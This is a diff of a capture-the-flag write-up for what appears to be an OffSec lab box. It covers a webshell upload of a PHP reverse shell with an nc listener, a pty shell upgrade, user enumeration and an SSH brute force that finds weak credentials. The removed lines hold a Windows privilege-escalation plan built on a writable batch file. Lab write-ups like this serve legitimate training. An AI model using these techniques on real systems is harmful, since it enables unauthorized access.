@@ -151,112 +151,76 @@ I tried multiple different wordlists here. All failed to enumerate anything. Thi
 
 I navigated to the last remaining interesting artifact: /mini.php
 
-![mini.php webshell](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/4.png)
+![mini.php webshell](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/5.png)
 
+Ah yeah, we have an psuedo-webshell. Looks like we can upload/delete files to the webserver. There are a couple of things we could do here, but I'll try to upload a PHP revershell to get a foothold.
 
+I'll use [Pentestmonkey's PHP reverse shell](http://pentestmonkey.net/tools/php-reverse-shell)
+
+Once downloaded I made changes to include my $attacker IP and port for my local listener.
+
+![Revshell mods](/assets/img/ctf/offsec/easy/FunBoxEasyEnum/6.png)
+
+I upload the file under the same name and then start a local listener:
+
+```bash
+┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]
+└─$ sudo nc -lvnp 4444
+[sudo] password for haunter: 
+listening on [any] 4444 ...
+connect to [192.168.45.209] from (UNKNOWN) [192.168.134.132] 33224
+Linux funbox7 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 19:03:21 up  1:04,  0 users,  load average: 0.00, 0.00, 0.07
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+www-data@funbox7:/$ whoami
+whoami
+www-data
+www-data@funbox7:/$ 
+
+```
+
+Great, we have a revshell. I upgrade my shell and check my user context.
+
+### Foothold Recon
+
+Let's check for users and then add them to users.txt locally:
+
+```bash
+# on $funbox
+www-data@funbox7:/home$ ls
+ls
+goat  harry  karla  oracle  sally
+```
+
+```bash
+# on $attacker
+┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]
+└─$ cat users.txt 
+goat
+harry
+karla
+oracle
+sally
+```
 
 ## Lateral Movement / Privilege Escalation
 
-Checking the C:\ drive is next. There are two dirs that stand out: *Log-Management* and *xampp*
+Since I tried other basic manual enum techniques already, I'll get linPEAS on $funbox and see if it finds any privEsc vectors. In the meantime I'll try an SSH bruteforce with the usernames I found.
 
-```bash                                                                        
-PS C:\Users\daniel> ls c:\                                                                             
-
-
-    Directory: C:\ 
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d-----        3/12/2020   3:56 AM                Log-Management
-d-----        9/15/2018  12:12 AM                PerfLogs
-d-r---        7/28/2021   2:01 AM                Program Files
-d-----        9/15/2018  12:21 AM                Program Files (x86)
-d-r---         3/5/2020   4:40 AM                Users
-d-----        7/28/2021   2:16 AM                Windows
-d-----         3/5/2020   9:15 AM                xampp
--a----        7/28/2021   3:38 AM              0 Recovery.txt
-```
-
-First I checked the MySQL DB for users / creds, but I did not find anything in any of the databases/tables:
+As I only have usernames at this point and no passwords, I find it best to *use the usernames as a password list first* before moving onto a password list like rockyou.
 
 ```bash
-PS C:\Users\daniel> C:\xampp\mysql\bin\mysql.exe -u root 
-
-Welcome to the MariaDB monitor.  Commands end with ; or \g.                                                                                                                                                              
-Your MariaDB connection id is 8
-Server version: 10.4.11-MariaDB mariadb.org binary distribution
-
-Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
-
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-
-MariaDB [(none)]> show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| goods              |                                 
-| information_schema |                                 
-| mysql              |                                 
-| performance_schema |                                 
-| phpmyadmin         |                                 
-| test               |                                 
-+--------------------+                                 
-6 rows in set (0.009 sec)    
+┌──(haunter㉿kali)-[~/working/offsec/easy/FunboxEasyEnum]
+└─$ nxc ssh $funbox -u users.txt -p users.txt --ignore-pw-decoding
+SSH         192.168.134.132 22     192.168.134.132  [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
+SSH         192.168.134.132 22     192.168.134.132  [+] goat:goat (Pwn3d!) Linux - Shell access!
 ```
 
-So that makes *C:\Log-Management\* as my next enumeration target.
-
-```bash
-PS C:\Users\daniel> ls C:\Log-Management\
-
-
-    Directory: C:\Log-Management
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--a----         3/6/2020   1:42 AM            346 job.bat
-```
-
-There is a *.bat* file. **When I see .bat files or custom .exes in unusual directories, I think of *Service Binary Hijacking* or similar**.
-
-```bash
-PS C:\Users\daniel> cd C:\Log-Management\
-
-PS C:\Log-Management> cat .\job.bat
-@echo off 
-FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
-IF (%adminTest%)==(Access) goto noAdmin
-for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
-echo.
-echo Event Logs have been cleared!
-goto theEnd
-:do_clear
-wevtutil.exe cl %1
-goto :eof
-:noAdmin
-echo You must run this script as an Administrator!
-:theEnd
-exit
-```
-
-When checking the file contents, it seems that this file needs to *run as admin*. So if this file runs under admin context AND it may be scheduled to run, we should definitely try to edit the file with a payload. Can we edit it?
-
-```bash
-PS C:\Log-Management> icacls.exe .\job.bat
-.\job.bat BUILTIN\Users:(F)
-          NT AUTHORITY\SYSTEM:(I)(F)
-          BUILTIN\Administrators:(I)(F)
-          BUILTIN\Users:(I)(RX)
-
-Successfully processed 1 files; Failed processing 0 files
-PS C:\Log-Management>
-```
-
-*BUILTIN\Users:(I)(RX)* can edit the file. That means our user context *daniel* can edit the file.
-
-Let's try to edit the file to call netcat for a revshell.
+To my surprise it actually got a hit with *goat:goat* 
 
 ## Root / SYSTEM
 
